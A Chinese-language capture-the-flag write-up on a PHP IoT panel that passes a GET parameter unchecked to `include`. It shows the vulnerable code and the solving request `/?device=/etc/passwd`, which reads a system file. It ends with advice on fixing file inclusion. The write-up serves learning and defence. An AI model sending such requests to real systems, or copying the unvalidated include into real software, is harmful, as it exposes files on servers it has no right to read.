# UMDCTF 2018 - web2

## 题目简述

这是一个 PHP 物联网控制面板。页面将 GET 参数 `device` 未经白名单校验直接传给 `include`，形成任意本地文件包含；容器构建脚本又把 flag 写入 `/etc/passwd`。

## 解题过程

页面原本提供三个合法值：

```text
thermostat.php
webcam.php
atm.php
```

但后端没有验证参数是否属于该列表：

```php
if (isset($_GET['device'])) {
    include($_GET['device']);
}
```

因此直接请求：

```text
/?device=/etc/passwd
```

PHP 会包含并输出该文本文件。Dockerfile 在构建镜像时执行：

```dockerfile
RUN echo "UMDCTF-{wh00ps_you_hacked_my_IOT}" >> /etc/passwd
```

响应末尾即可看到：

```text
UMDCTF-{wh00ps_you_hacked_my_IOT}
```

仓库的 `php.ini` 还启用了 `allow_url_include`，理论上会扩大到远程包含风险，但读取本题 flag 只需要本地文件包含，不必依赖外部服务器。

## 方法总结

HTML 下拉框不是安全边界，攻击者可以任意修改请求参数。文件包含接口必须把外部标识映射到服务端固定文件，不能直接把路径交给 `include`；审题时也要结合 Dockerfile，确认敏感数据实际落在容器的哪个位置。
